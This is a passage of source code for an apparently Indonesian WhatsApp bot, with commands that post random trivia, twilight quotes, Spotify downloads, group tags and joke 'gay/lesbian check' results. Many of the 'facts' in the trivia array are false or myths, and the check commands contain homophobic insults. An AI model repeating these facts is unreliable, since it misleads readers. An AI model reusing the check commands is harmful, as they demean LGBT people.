"Buku Guinness Book of Records memegang rekor sebagai buku yang paling banyak dicuri dari perpustakaan",
"35% dari orang yang ikut kontak jodoh lewat internet, sudah menikah",
"CocaCola dulu berwarna hijau",
"Secara fisik, babi tidak bisa melihat ke langit",
"Semua beruang kutub kidal",
"Kelelawar selalu belok kiri jika terbang keluar gua",
"Jim Henson pertama kali memakai kata “Muppet”. Kombinasi dari “marionette” dan “puppet”",
"Gajah satu-satunya hewan yang tidak bisa meloncat",
"The Michelin man (figur berbaju dan bertopi putih diiklan Michelin) bernama Mr. Bib. nama aslinya Bibendum pada iklan pertama tahun 1896",
"Kita tidak bisa menjilat siku kita sendiri",
"Kata “lethologica” menggambarkan saat dimana kita tidak bisa mengingat apa yang kita inginkan",
"Sekitar 14% pecandu yang menggunakan jarum suntik, positif HIV",
"Kalimat yang bisa dibaca sama dari depan dan belakang (racecar, kayak, tamat) disebut “palindrome” ",
"Siput bisa tidur selama 3 tahun",
"Diatas khatulistiwa melintas sekitar 200 satelit asing, termasuk satelit mata-mata",
"Orang di Cina lebih banyak yang berbahasa Inggris dari pada orang di Amerika",
"Karena pengaruh rotasi bumi, kalau kita melempar kearah barat, lemparan kita akan lebih jauh jatuhnya dari pada kearah timur",
"Satu dari 9000 orang menderita albino",
"Kursi listrik ditemukan oleh seorang dokter gigi",
"Kita berulang tahun bersama 9 juta orang dari seluruh dunia",
"Setiap manusia dalam hidupnya rata-rata habis untuk menunggu dilampu merah selama 2 minggu",
"Botol aqua dan tempat makan plastik baru bisa terurai dengan sempurna dalam tanah setelah 50.000 tahun",
"Kucing bisa membuat lebih dari 100 bunyi vokal, anjing hanya bisa sekitar 10",
"Gigi berang-berang tak pernah berhenti ",
"Kelelawar adalah satu-satunya mamalia yang bisa terbang",
"Jika boneka Barbie adalah manusia, ukurannya adalah 39-23-33 (99-58,5-84 cm). Tingginya sekitar 215 cm dan punya leher 2kali lebih panjang daripada manusia normal",
"Tikus beranakpinak sangat cepat dan dalam waktu 18 bulan, dua tikus dapat memiliki lebih dari 1 juta keturunan",
"Memakai Headphone selama 1 jam dapat mengembangbiakan bakteri dalam kuping 700 kali lebih cepat",
"Seekor Babon bernama ‘Jackie’ menjadi prajurit resmi dalam angkatan bersenjata Afrika Selatan pada Perang Dunia I",
"Bibliophile adalah sebutan untuk kolektor buku-buku langka. Bibliopole adalah penjual buku-buku langka",
"Jantung ikan paus biru berdenyut 9 kali dalam semenit",
"Arabic numerals bukan berasal dari Arab, tapi diciptakan di India",
"Kupu-kupu melihat dengan 12000 mata",
"Bulan February tahun 1865 adalah satu-satunya bulan dalam catatan sejarah yang tidak sempat mengalami bulan purnama",
"Ayam yang sudah terpenggal lehernya masih mampu lari sepanjang lapangan bola sebelum benar-benar mati",
"Kecoak bisa hidup 9 hari tanpa kepala, dan akan mati karena kelaparan",
"Di Bumi, satu tahun adalah 365 hari. Di planet Merkurius satu tahun adalah 2 hari",
"Umur dari capung adalah 24 jam",
"Pada Usia 3 bulan janin manusia mulai terbentuk sidik jari",
"Butuh waktu 6 bulan untuk kuku kaki tumbuh dari bawah paling bawah sampai ujung kuku",
"Daya ingat ikan hanya 3 detik",
"Bulan purnama 9 kali tebih terang daripada bulan setengah",
"Untuk setiap patung memorial orang diatas kuda, jika 2 kaki depan kuda mengangkat, maka orang tersebut tewas dalam pertempuran, jika satu kaki kuda yang terangkat, maka orang tersebut meninggal karena luka dalam pertempuran, jika 4 kakinya menginjak tanah, orang tersebut meninggal secara normal",
"Beruang dewasa dapat lari secepat kuda",
"Tulang kuda lebih banyak 18 buah dari tulang manusia",
"Ubur-ubur terdiri dari 95% air",
"Kulit Zebra adalah putih yang bergaris hitam",
"Kecuali manusia dan monyet, semua mamalia buta warna",
"Biji apel mengandung sianida",
"Tikus dan kuda tidak bisa muntah",
"Penguin adalah burung yang tidak bisa terbang tapi bisa berenang",
"Astronot Don't mengkonsumsi kacang sebelum menjelajah ruang angkasa karena jika buang angin dalam baju khusus astronot dapat membahayakan mereka",
"Winston Churchill lahir di toilet wanita saat acara dansa",
"Sebelum ada pesawat jet, Jetlag disebut Boatlag",
"Kucing berkeringat melalui telapak kakinya (terutama saat mendengar gonggongan anjing)",
"Kucing tidak bisa merasakan rasa manis",
"Coklat meleled dalam mulut karena titik lelehnya adalah 35 derajat celcius",
"Dalam perang dahulu, orang yang buta warna dibutuhkan dalam tim pendeteksi kamuflase di militer",
"Sapi tidak punya gigi atas",
"Hedenophobic berarti takut akan kesenangan",
"Pendeta Mesir kuno mencabuti setiap helai rambut dan bulu dari badan mereka",
"Buaya tidak bisa menjulurkan lidah",
"Kentut sapi termasuk penyebab utama global warming",
"Semut selalu jatuh miring ke kanan jika diberi racun serangga",
"Kucing rumah benci bau lemon dan semua yang berbau sitrus",
"Donal Bebek Don't beredar di Finlandia karena Donal tidak pakai celana",
"Nama asli Donal bebek adalah Donald Flauntleroy Duck",
"Indra perasa kupu-kupu ada dikakinya",
"Dry Ice tidak meleleh, tapi menguap",
"Mata burung unta lebig besar dari otaknya",
"Bintang laut tidak punya otak",
"Tiap manusia punya telinga yang berbeda",
"Telur segar tenggelam diair, telur yang kadaluarsa mengambang",
"80% dari seluruh binatang di dunia adalah serangga",
"Kacang adalah salah satu bahan untuk membuat dinamit",
"Ratu Elizabeth I menderita Anthophobia (takut akan mawar)",
"RSVP adalah Respondez s’il Vous Plait yang artinya ‘mohon jawaban’",
"Mata manusia yang sehat (tidak buta warna) dapat menbedakan 500 jenis warna abu-abu",
"Ikan mas yang bunting disebut ‘twit’",
"Eropa adalah benua tanpa padang pasir",
"Lalat meloncat mundur saat akan terbang",
"Sekeor kucing memiliki 32 otot pada tiap telinga",
"A honeybee can fly at fifteen miles per hour",
"Macan mempunyai kulit yang belang,bukan hanya bulu yang belang",
"A “jiffy” is the scientific name for 1/100th of a second",
"Hanya 3 malaikat, Gabriel, Michael dan Lucifer yang disebut dalam injil",
"Kambing mempunya pupil mata segi empat",
"Novel pertama yang menggunakan mesin tik adalah Tom Sawyer",
"Hamster sangat suka makan jangkrik",
"Pemantik ditemukan sebelum korek api",
"Rata-rata dalam setiap batang permen coklat terdapat serangga yang meleleh bersamanya",
"Tanduk badak terbuat dari rambutnya yang mengeras",
"Perang paling singkat dalam sejarah adalah perang Zanzibar and England tahun 1896. Zanzibar menyerah setelah 38 menit",
"Kutu rambut sebenarnya lebih suka hidup di kulit kepala yang bersih dari pada yang kotor",
"Kulit beruang kutub sebenarnya hitam. Bulunya berwarna bening, dan tampak putih di salju",
"Elvis mempunyai saudara kembar bernama Garon, yang meninggal saat lahir, maka nama tengah Elvi adalah Aron, untuk menghormati saudaranya",
"Landak punya sidik jari yang mirip manusia",
"Kuda Nil kentut lewat mulut",
"Shakespeare yang menemukan kata “assassination” dan “bump”",
"Mahluk yang bisa tersipu-sipu hanya manusia",
"Jika kita memelihara ikan mas dalam ruangan yang gelap, warnanya akan berubah putih",
"Wanita berkedip dua kali lebih banyak dari pria",
"Nama Jeep (jip) diampil dari singkatan “GP”, bahasa militer untuk General Purpose",
"Orang yang menggunakan tangan kanan, kira-kira, 9 tahun lebih panjang umur dari orang kidal",
"Jika semua emas dalam laut ditambang, setiap manusia didunia bisa mendapat emas 20 kg masing2",
"Jika lever manusia berhenti bekerja, manusia akan mati dalam 8 samapai 24 jam",
"Seorang “quidnunc” adalah sebutan untuk orang yang selalu ingin tahu gosip terbaru",
"Jika matahari tiba-tiba padam, butuh 8 menit bagi manusia untuk menyadarinya",
"Leonardo Da Vinci yang menemukan gunting, helikopter, dan banyak alat lainnya",
"Dalam 4000 tahun, tidak ada jenis binatang peliharaan baru",
"25% dari tulang manusia ada di kaki",
"David Sarnoff adalah orang yang menerima sinyal Titanic dan meyelamatkan ratusan nyawa. Dia akhirnya menjadi kepala jaringan radio, the National Broadcasting Company (NBC)",
"Kira-kira 100 orang tersedak ballpoint tiap tahun",
"Jika kita terkunci diruang yang kedap udara, kita aka lebih dulu mati keracunan co2 dari pada kekerangan o2",
"Jika kita kehilangan satu mata, kita akan kehilangan 1/5 dari pengelihatan kita dan kehilangan seluruh persepsi tentang kedalaman objek",
"Berdiri lama tanpa menekuk lutuk sama sekali akan membuat kita pingsan",
"Bawang putih yang kita gosok di tumit kaki akan meresap dapat dapat tercium dalam nafas kita",
"Dengan merentangkan kedua tangan sejauh mungkin, jarak dari kedua ujung tangan adalah sama dengan tinggi kita",
"Liburan selama sebelas hari berarti kita punya waktu hampir sejuta detik untuk menikmatinya",
"Dalam film Silence of The Lambs, tokoh Hannibal Lecter tidak pernah berkedip",
"Di jepang, warung kopi disebut ‘Kissaten’",
"Merebus telur burung unta butuh waktu 40 menit",
"Jaguar takut pada anjing",
"Gajah hanya tidur 2 jam dalam sehari",
"Johnny Deep takut pada badut",
"Ganymede adalah bulan planet Jupiter, merupakan bulan terbesar di tata surya kita, lebih besar dari planet Merkurius",
"Dalam golf, ‘Bo Derek’ adalah istilah untuk nilai 10",
"Koala punya dua jempol",
"Latte dalam bahasa Italia adalah susu",
"Llanfairpwllgwyngyl lgogerychwyrndro bwlll… adalah nama sebuah desa di Wales Utara, Inggris",
"Di Italia, Micky Mouse lebih dikenal dengan nama ‘ Topolino’",
"Susu sebenarnya lebih menyerupai makanan daripada minuman",
"Ada lebih dari 450 jenis susu di dunia. 240 berasal dari Prancis",
"Nyamuk lebih suka anak-anak daripada orang dewasa",
"Partikel debu didalam rumah sebagian besar berasal dari sel kulit mati",
"Rat-rata orang bergerak 40 kali dalam tidurnya",
"Dalam bahasa Inggris, ‘Naked’ artinya tanpa perlindungan. ‘Nude’ artinya telanjang",
"Broccoli dan kembang kol adalah sayuran yang berupa bunga",
"Anak baru lahir memiliki 350 tulang. Mereka menyatu atau menghilang sampai menjadi 206 pada usia 5 tahun",
"Tidak ada bukti yang pasti siapa yang membangun Taj Mahal",
"Dalam survey terhadap 200000 burung unta selama 80 tahun, tidak ada satupun yang mengubur kepalanya dalam tanah",
"Nail Amstrong melangkah pertama kali di bulan dengan kaki kiri",
"Shuttlecock untuk badminton harus punya 14 bulu",
"Mutiara bisa larut dalam cuka",
"Babi tidak dapat berkeringat karena tidak punya kelenjar keringat. Mereka berlumur lumpur untuk mendinginkan kulitnya",
"Venus dan Uranus adalah planet di tata surya kita yang berputar melawan jarum jam. Jadi matahari terbit dari barat di planet ini",
"Microwave ditemukan setelah seorang ilmuan yang berjalan melewati tabung radar mendapati permen coklatnya meleleh disakunya",
"Ikan hiu kebal terhadap kanker",
"Rusa Santa bernama: Dasher, Dancer, Prancer, Vixen, Comet, Cupid, Donner, dan Blitzen",
"Beberapa jenis cacing pita akan memakan dirinya sendiri jika kelaparan",
"Kita bisa menghela sapi naik tangga, tapi tidak bisa menghela mereka turun tangga",
"Plakat yang ditinggalkan Apollo 11 di bulan berbunyi “Here men from the planet Earth first set foot upon the Moon July 1969, A.D. / WE CAME IN PEACE FOR ALL MANKIND",
"Alpabet Hawai terdiri dari 12 huruf saja",
"Nama paling populer di dunia adalah Muhammad",
"Bola mata kita beratnya sekitar 28 gram",
"Paru-paru kiri lebih kecil dari paru-paru kanan karena memberi tempat terhadap jantung",
"Pinguin hanya ada di kutub selatan, dan tidak bisa menyebrangi equator",
"Kebanyakan orang bisa mendengar lebih baik dengan kuping kanan",
"Vitamin pada buah biasanya terdapat pada kulitnya",
"Rata-rata klakson mobil berbunyi pada nada F",
"Pria lebih mampu membaca tulisan dengan ukuran huruf kecil daripada wanita"]
const coco = faktaa[Math.floor(Math.random() * faktaa.length)]
Al.sendMessage(m.chat, {text: `${coco}` }, {quoted: fkontak})
}
break
//========================
case 'senja':
case 'quotessenja':
case 'qsenja': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
const senjaa = ["Senja selalu cantik kecuali saat kau patah hati.",
  "Aku masih rindu. Namun senja tak ingin lama bertamu.",
  "Ada yang tak tenggelam ketika senja datang, yakni rasa.",
  "Karena senja selalu menerima langit apa adanya.",
  "Setiap senja selalu menjanjikan kita awal yang baru.",
  "Senja telah mengajarkanku apa arti dari mengikhlaskan.",
  "Biar lelah, tapi dia tetap indah. Itulah senja.",
  "Senja tak pernah salah, hanya kenangan yang membuatnya basah.",
  "Hanya senja yang tau cara berpamitan dengan indah.",
  "Senja, perpaduan yang sungguh indah bagi alam semesta.",
  "Selepas senja, aku kembali menjadi manusia yang menutupi air mata dengan gelak tawa.",
  "Senjaku mulai menepi ke peraduannya.",
  "Karena senja tak pernah memintamu menunggu.",
  "Entah mana yang lebih indah, senja yang mulai memerah atau senyummu yang mulai merekah.",
  "Senja tak pernah membenci awan kelabu yang sering menutupinya.",
  "Jadilah seperti senja yang kehadirannya selalu membuat ketenangan dan kepergiannya selalu membuat kerinduan.",
  "Kamu seperti senja,terasa menyenangkan namun tak bertahan lama.",
  "Aku hanya dapat menikmati kehangatan senja yang tak akan pernah untuk menikmati kehangatan pelukanmu.",
  "Senja telah mengajarkan ku apa arti dari mengikhlaskan.",
  "Kamu bagaikan senja di sore hari, indah sesaat kemudian menghilang.",
  "Senja mengajarkan kita bahwa keindahan tak harus datang lebih awal.",
  "Senja tak pernah salah, hanya kenangan yang membuatnya basah.",
  "Kenyataanya senja tetaplah senja. Dia tak punya rasa, dia memberi indah sesaat kepada penikmatnya, lalu pergi begitu saja.",
  "Di antara senja dan keheningan tempat ini, mengingatmu menjadi kesibukan kecil yang membahagiakan.",
  "Di ujung senja yang sudah hampir hilang kali ini aku masih menanti sebuah kabar dan ku tak tahu harus berapa lama ku menunggu.",
  "Untuk luka yang terhapus senja, untuk duka yang makin meraja, yakinlah hati agar membaja, bisikan lembut dengan senyuman manja, Insyaallah bersama Allah semuanya akan baik-baik saja.",
  "Saat senja menyapa, aku menyadari bahwa masih banyak hal indah yang Tuhan ciptakan selain Kamu.",
  "Demi matahari senja yang menggantung manis manja di cakrawala, demi kebaikan dan ketulusan yang telaten diberikan semesta, dan demi ragam nama-nama Tuhan baik yang akrab maupun asing di telinga kita, sesungguhnya, manusia, adalah mahkluk yang merugi. Kecuali, ia yang mau belajar pada masa silam, berbuat yang terbaik di masa sekarang, dan menyiapkan segala sesuatu di masa depan, dengan keyakinan paling yakin pada terwujudnya sebuah impian.",
  "Tuhan, bersama tenggelamnya matahari senja ini, redakanlah kekecewaan dan kemarahan di hati ini. Sabarkanlah aku. Aamiin.",
  "Nikmat Allah mana yang kau dustakan disenja ini wahai saudara-saudaraku semua.",
  "Di tengah angin senja yang mendesak, aku merasakan kekuasaan waktu, yang tanpa pandang bulu mengubah segala-galanya.",
  "Terkadang senja mengingatkan pada rumah, pada orang-orang yang membuat hati kita rindu untuk pulang.",
  "Salah satu nikmat Allah yang sampai detik ini bisa kurasakan adalah masih bisa bernapas dan menghirup segarnya udara senja.",
  "Salam senja dan Magrib. Doa kita kepada yang maha kuasa hanya taubat jawabannya, dosa kita kepada sesama berminta maaf penawarnya.",
  "Gelombang adzan mendayu meminang senja. Di sanalah, Tuhan melahirkan segala rindu.",
  "Engkau terkadang datang seperti jingga di kala senja, datang dengan keindahan berlalu menyisakan kegelapan.",
  "Senja: Mengajarkan kita bahwa yang indah pasti akan tenggelam.",
  "Senja pergi secara perlahan, karena ia tahu pergi secara tiba-tiba hanya menyakiti siapapun yang menikmatinya.",
  "Walau senja tinggalkan keindahan dan pergi, ia selalu datang kembali di esok hari. Tak seperti kamu yang lebih indah dari senja tapi pergi entah kemana.",
  "Ku mencintai kau seperti senja. Dengan keindahannya, tanpa durasinya.",
  "Jangan mengulangi kesalahan yang sama, karena masih banyak kesalahan kesalahan lain yang perlu dicoba.",
  "Terima kasih senja, kau telah menampakkan bahwa perpisahan tak semuanya menyakitkan. Dan kepergian tampak begitu indah tanpa kehangatan.",
  "Senja itu seperti kita, singkat dan bahagia.",
  "Aku hanyalah penikmat kehangatan senja yang tak akan bisa menikmati kehangatan pelukanmu.",
  "Hari ini aku belajar dari senja bahwa yang indah dan mempesona akan hilang dan tenggelam pada waktunya.",
  "Tanaman palsuku mati karena aku tidak berpura pura menyiramnya.",
  "Jangan rindu berat, kamu nggak akan kuat. Biar aku saja yang merindukanmu sekalipun bertambah berat badanku.",
  "Bermimpilah setinggi langit, jika kamu terjatuh berarti tidurmu kurang ke tengah.",
  "Dusk is proof that no matter what happens, everyday can end beautifully.",
  "From the twilight I learned that every beautiful things had to go through all the painful things.",
  "Twilight drops her curtain down, and pins it with a star. Lucky Maud Montgomery.",
  "Dusk teaches us that life is not always bright and shining.",
  "Twilight comes in a beautiful way. As beautiful as God ways in meet us.",
  "Every sunset bring a promise for a new dawn. -Ralph Waldo Emerson",
  "Dusk teaches us to appreciate all the great things the sun gives us.",
  "Don't forget that beautiful twilight needs blackened clouds.",
  "And dusk makes us understand the meaning of the word 'willing'.",
  "Twilight fell: The sky turned to a light, dusky purple littered with tiny silver stars. J.K. Rowling",
  "Pengagum senja, penyesap kopi, penikmat rindu, penimba ilmu, peninggi badan, pemanjat sutet, pembuka simontok, penyembah tutup botol.",
  "Tangannya menjadi pengganti tanganku untuk menuntunmu' Pundaknya menjadi pengganti pundakku untukmu bersandar. Biarlah gemercik gerimis, carik senja, secangkir teh, dan bait lagu menjadi penggantimu.",
  "Mulai mempertanyakan alam raya, galaksi, planet-planet dan eksistensi saya di muka bumi ketika pagi-pagi belum juga ingin buang air besar.",
  "Jodoh tak akan ke mana-mana terlebih dahulu sebelum akhirnya menetap.",
  "Jatuh hati tidak pernah bisa memilih. Tuhan memilihkan. Kita hanyalah korban. Kecewa adalah konsekuensi, bahagia adalah bonus.",
  "Hujan dan gebetan itu mirip. Ada yang mengaku suka, tapi hanya memandangnya dari tempat duduk yang hangat, berkata-kata romantis tanpa pernah mau bersinggungan. Ada yang betulan suka, mengalahkan rasa tidak nyaman, langsung berinteraksi dengannya meski berisiko sakit.",
  "Enak atau tidaknya ucapan selamat malam dan selamat pagi itu tergantung siapa yang mengucapkan.",
  "Denganmu, basa-basi terasa berisi.",
  "Absurd sekali, kita. Cerita berjam-jam, lalu hilang kabar berhari-hari. Merindu diam-diam, hingga tidak lagi saling mencari.",
  "Aku lelah sembunyi, lelah merindukanmu dalam sunyi. Tanganku jangan dijabat, baiknya digenggam saja. Tak cuma jadi sahabat, jadi kekasihmu juga.",
  "Jangan pernah lupa, bahwa awan menghitam adalah yang membuat senja terlihat sempurna.",
  "Meski senja tiba di ujung mata, rindu enggan tinggalkan kita, tak peduli dengan siapa menanti malam, rindu ini senantiasa menyapa.",
  "Ketika senja mulai tenggelam, ku mulai menyadari kamu yang paling berarti, dan ketika sinar matahari menyapa ku sadari kamu hanya mimpi.",
  "Senjaku berlari mengejar ketinggalannya, menyusuri setapak di tepian jurang menganga, di bawahnya riuh ombak berirama lara.",
  "Jika kamu senja, maka aku jingga. Muncul bersama, hilang pun juga.",
  "Matahari yang tenggelam akan mengajarkan pada kita, agar bisa menghargai apa yang diberikan matahari untuk kita.",
  "Senja begitu cepat berganti, dan sampai saat ini kau tetap kunanti.",
  "Senja memang begitu indah, namun cahaya mentari tetap tak tergantikan, meski dengan lilin yang bersinar sangat terang sekalipun.",
  "Saat jingga bersetubuh dengan gelap, sepasang mata sibuk kemasi air matanya; seakan takut, senja mencuri rindu miliknya.",
  "Senja mengajarkan pada kita, bahwa kehidupan tak selalu berjalan dengan cemerlang dan bersinar."]
const cece = senjaa[Math.floor(Math.random() * senjaa.length)]
Al.sendMessage(m.chat, {text: `${cece}` }, {quoted: fkontak})
}
break
//========================
case 'spotify':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply(`Mana Link nya bang?`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) return m.reply(`The link you provided is not spotify link`)
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `*Title:* ${name || ''}\n*Artists:* ${(artists || []).join(
            ','
        )}\n*Album:* ${album_name}\n*Release Date:* ${release_date || ''}`
       const responsee = await Al.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
        const bufferpotify = await spotify.download()
        await Al.sendMessage(m.chat, { audio: bufferpotify }, { quoted: responsee })
break
//========================
case 'spotifys':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
	if (!q) return m.reply(`Nama Musik nya mana bang?`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
    try {
        const apiUrl = `https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(q)}`
        const responsee = await fetch(apiUrl);
        if (!responsee.ok) {
            console.log('Error searching for song:', responsee.statusText)
            return m.reply('Error searching for song')
        }
        const data = await responsee.json()
        const coverimage = data.spty.results.thumbnail
        const name = data.spty.results.title
        const slink = data.spty.results.url
        const dlapi = `https://www.guruapi.tech/api/spotifydl?text=${encodeURIComponent(q)}`
        const audioResponse = await fetch(dlapi)
        if (!audioResponse.ok) {
            console.log('Error fetching audio:', audioResponse.statusText)
            return m.reply('Error fetching audio')
        }
        const audioBuffer = await audioResponse.buffer()
        const tempDir = os.tmpdir()
        const audioFilePath = path.join(tempDir, 'audio.mp3')
        try {
            await fs.promises.writeFile(audioFilePath, audioBuffer)
        } catch (writeError) {
            console.error('Error writing audio file:', writeError)
            return m.reply( 'Error writing audio file')
        }
        let doc = {
            audio: {
              url: audioFilePath
            },
            mimetype: 'audio/mpeg',
            ptt: true,
            waveform:  [100, 0, 100, 0, 100, 0, 100],
            fileName: "Spotify Downloader",
            contextInfo: {
              mentionedJid: [m.sender],
              externalAdReply: {
                title: `Playing To ${name}`,
                body: namabot,
                thumbnailUrl: coverimage,
                sourceUrl: myweb,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
        }        
        await Al.sendMessage(m.chat, doc, { quoted: m })
    } catch (error) {
        console.error('Error fetching Spotify data:', error)
        return m.reply('Error kak, Silahkan coba lagi nanti')
    }
    }
    break
//========================
case 'tagmem':
case 'tagsemua':
case 'tagall': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isOwner) return m.reply('Fitur Khusus Admin grup!')
me = m.sender
let teks = `*TAGALL ${groupName}* 
*Tagger :*  @${me.split('@')[0]}
*Message :* ${q ? q : 'Tidak ada'}\n\n*TAG NYA*\n`
for (let mem of participants) {
teks += `• @${mem.id.split('@')[0]}\n`
}
Al.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m})
}
break
//========================
case 'gaycek':
case 'cekgay': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Contoh #1 :* ${prefix}cekgay @Tag\n\n*Contoh #2 :* ${prefix}cekgay Wann?`)
const gey = ['1% Nggak gay', '10% Gak terlalu gay ah', '20% Gay dikit sih', '30% Gay', '40% Gay dikit', '50% Lumayan', '60% Lumayan gay', '70% Gay bjir', '80% Gay bjir amat', '90% Gay bnget', '100% Najis gay bego', 'Gak tau', 'Kamu nanya']
const jirr = gey[Math.floor(Math.random() * gey.length)]
m.reply(`*Pertanyaan :* Cekgay ${q}\n*Jawaban :* ${jirr}`)
}
break
//========================
case 'lesbycek':
case 'ceklesby': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Contoh #1 :* ${prefix}ceklesby @Tag\n\n*Contoh #2 :* ${prefix}ceklesby Luna Maya`)
const lesbi = ['1% Nggak lesby', '10% Gak terlalu lesby ah', '20% Lesby dikit sih', '30% Lesby', '40% Lesby dikit', '50% Lumayan', '60% Lumayan lesby', '70% Lesby bjir', '80% Lesby bjir amat', '90% Lesby bnget', '100% Najis lesby bego', 'Gak tau', 'Kamu nanya']
const loll = lesbi[Math.floor(Math.random() * lesbi.length)]
m.reply(`*Pertanyaan :* Ceklesby ${q}\n*Jawaban :* ${loll}`)
}
break
//========================
case 'renungan': 
case 'quotesrenungan':
case 'qrenungan': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
const renung = [
"https://telegra.ph/file/f52f8d6312f3ac2590727.jpg", 
"https://telegra.ph/file/35cb9decc525a3453ba87.jpg",
"https://telegra.ph/file/5996566cb5cd615f60f51.jpg",
"https://telegra.ph/file/87ecb0f385ae390c609e8.jpg",
"https://telegra.ph/file/7ca48dd2329937b7f86da.jpg", 
"https://telegra.ph/file/e2d603fa0ec9004ca9e2f.jpg",
"https://telegra.ph/file/f8f9ac3d38c9e3c9456ec.jpg",
"https://telegra.ph/file/9e1f626f4005b6f16d904.jpg",
"https://telegra.ph/file/6300478b6ffdf0c0001e9.jpg",
"https://telegra.ph/file/dca222749fb98ce0384f7.jpg",
"https://telegra.ph/file/295f6f6164794a2156d2e.jpg",
"https://telegra.ph/file/429cb39112f2870327398.jpg",
"https://telegra.ph/file/9d96d5fcc89c6f30e086f.jpg",
"https://telegra.ph/file/c396c9da3800536792139.jpg",
"https://telegra.ph/file/6d2fc9ac5c878fa93c43f.jpg",
"https://telegra.ph/file/09174bfbe94a756a90411.jpg",
"https://telegra.ph/file/2dcd363e5f9eb42d88cc0.jpg",
"https://telegra.ph/file/798daf4f7a87bbabc8694.jpg",
"https://telegra.ph/file/4052c388390385d9c79f3.jpg", 
"https://telegra.ph/file/d8f1a14f712d6a860b36c.jpg",
"https://telegra.ph/file/eed16ec2df3cc22102e7b.jpg",
"https://telegra.ph/file/0738833300f1620285b36.jpg",
"https://telegra.ph/file/dc464f93b5a579c279979.jpg",
"https://telegra.ph/file/0e0aa4e97675b2e649ddc.jpg",
"https://telegra.ph/file/2b58e9e63b38ac837e8cd.jpg",
"https://telegra.ph/file/49029a0e94ee5d710b6a9.jpg",
"https://telegra.ph/file/3a1ecc7774208670ec781.jpg",
"https://telegra.ph/file/46a125a6a3dc13cee931e.jpg",
"https://telegra.ph/file/37c358438489180b48723.jpg",
"https://telegra.ph/file/6287bc3f9b7876aeb5554.jpg",
"https://telegra.ph/file/684f268210c2de5d44bc6.jpg",
"https://telegra.ph/file/166b0d7fd1fcc55a09449.jpg",
"https://telegra.ph/file/f6713bdd595530bb38df9.jpg",
"https://telegra.ph/file/6738bff78091aa85a6cd7.jpg",
"https://telegra.ph/file/370d394c23fd162c6c9be.jpg",
"https://telegra.ph/file/38f2ceb0daf966fe7ddcf.jpg",
"https://telegra.ph/file/d23c4cedab7bf64915ba2.jpg",
"https://telegra.ph/file/3e72698c996538ee50ccf.jpg",
"https://telegra.ph/file/0379370add3bbae122008.jpg",
"https://telegra.ph/file/873d1b18acf16088786ca.jpg",
"https://telegra.ph/file/823e0664c7edec135b847.jpg",
"https://telegra.ph/file/8c8da910ab52c7a2b7ccf.jpg",
"https://telegra.ph/file/8037b52b84e8c39060f89.jpg",
"https://telegra.ph/file/e6da062c873aca03d25d4.jpg",
"https://telegra.ph/file/ef307b95c45e77defd0e1.jpg",
"https://telegra.ph/file/d66123bde1e967adf72b9.jpg",
"https://telegra.ph/file/7a2a376d1d152d382ae1a.jpg",
"https://telegra.ph/file/f8d0253bb97ea30e04275.jpg",
"https://telegra.ph/file/bbe65705f8dc9558eb177.jpg",
"https://telegra.ph/file/c7530031da08b4441ee9f.jpg",
"https://telegra.ph/file/5c1f7320f1b457911c3c2.jpg",
"https://telegra.ph/file/5a8600f4651e9497f6562.jpg",
"https://telegra.ph/file/053032e59ced4dac9ed3d.jpg",
"https://telegra.ph/file/ef61d077b685d47a11ff0.jpg",
"https://telegra.ph/file/c8a5cc9b9da57299a1f25.jpg",
"https://telegra.ph/file/2ed057545501fc3bc8de0.jpg",
"https://telegra.ph/file/b3b7c0c22e7dba04cab03.jpg",
"https://telegra.ph/file/62579a62376550e6590b1.jpg",
"https://telegra.ph/file/d140b0791799af2f67315.jpg",
"https://telegra.ph/file/81fd213f74b1235ef18fc.jpg",
"https://telegra.ph/file/d00db1507843f4ead46d8.jpg",
"https://telegra.ph/file/dedfa2294f4eb845acac4.jpg",
"https://telegra.ph/file/2b3700178b39c9c01e9b4.jpg",
"https://telegra.ph/file/a7be3d06c7dd9b8475579.jpg",
"https://telegra.ph/file/f7d91295ec35c44af8c90.jpg",
"https://telegra.ph/file/01e42d9181311dd7d2d70.jpg",
"https://telegra.ph/file/e5cf6db288acbfbb13f2b.jpg",
"https://telegra.ph/file/5a6ee797141b96fcebcce.jpg",
"https://telegra.ph/file/88d5b22d7a40365f59fc4.jpg",
"https://telegra.ph/file/0de4de20e35f6c9b12af6.jpg",
"https://telegra.ph/file/6b60a05a32e7bdbb62c2d.jpg",
"https://telegra.ph/file/549e5a1dbd0aebbd909c6.jpg",
"https://telegra.ph/file/d9d0c658ef1ea088d3579.jpg",
"https://telegra.ph/file/4c8fa9809897b7bd3eb03.jpg",
"https://telegra.ph/file/a58ee2c51fdc6c78ed7f6.jpg",
"https://telegra.ph/file/f2253a885cb84af5d588c.jpg",
"https://telegra.ph/file/f17bd255b176da6943240.jpg",
"https://telegra.ph/file/279afb02b1fcf93abdae4.jpg",
"https://telegra.ph/file/8ba4a8f31cf0673f6aa87.jpg",
"https://telegra.ph/file/c842818563065460b022e.jpg",
"https://telegra.ph/file/99e10142aeef70961437a.jpg",
"https://telegra.ph/file/33da8321603f78cd165f4.jpg",
"https://telegra.ph/file/63678732998176b22fa96.jpg",
"https://telegra.ph/file/b79bb874be90a34cd5786.jpg",
"https://telegra.ph/file/148875b883f91ac8b42e6.jpg",
"https://telegra.ph/file/275d948e0ed99652b4c52.jpg",
